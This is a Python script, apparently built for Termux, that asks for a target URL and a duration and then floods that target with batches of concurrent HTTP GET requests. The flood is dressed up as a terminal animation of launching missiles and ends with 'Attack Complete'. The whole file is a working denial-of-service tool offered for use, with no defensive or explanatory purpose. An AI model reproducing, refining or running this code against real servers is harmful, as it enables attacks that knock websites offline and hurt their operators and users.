import asyncio
import aiohttp
import random
import time
import os
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2  # leave 2 lines for bottom

# Clear terminal
def clear():
    print("\033[H\033[J", end="")  # ANSI clear for Termux

# Countdown loader
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        await asyncio.sleep(1)

# Small missile body
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

class Missile:
    def __init__(self):
        self.reset()

    def reset(self):
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        # speed determines type: 1=avg,2=fast,3=hypersonic
        self.speed = random.choice([1,2,3])
        self.active = False
        self.launch_delay = random.uniform(1,3)
        self.exhaust = random.choice(EXHAUST_FRAMES)
        # Assign request batch based on speed
        if self.speed == 3:   # hypersonic
            self.batch = 200
        elif self.speed == 2: # fast ballistic
            self.batch = 100
        else:                 # average
            self.batch = 1

# Draw missiles with request note
def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    # Add note beside missile
                    if i == 0:  # first line shows batch
                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch} REQ]"
                    else:
                        buffer[pos] += " " * missile.x + line
            # Exhaust at bottom
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# HTTP request sending per missile batch
async def send_missile_requests(target, batch):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(batch):
            tasks.append(session.get(target))
        try:
            await asyncio.gather(*tasks)
        except:
            pass

# Main loop
async def main():
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    missiles = [Missile() for _ in range(2)]  # mini swarm

    start_time = time.time()
    last_launch_times = [0]*len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        tasks = []
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                # Launch requests for this missile
                tasks.append(send_missile_requests(target, missile.batch))
            missile.y -= missile.speed
            if missile.y < -len(MISSILE_BODY):
                missile.reset()
        draw_missiles(missiles)
        if tasks:
            asyncio.create_task(asyncio.gather(*tasks))
        await asyncio.sleep(0.05)

    print("=== TOS-1: Attack Complete ===")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
        print("TOS-1 terminated by user.")
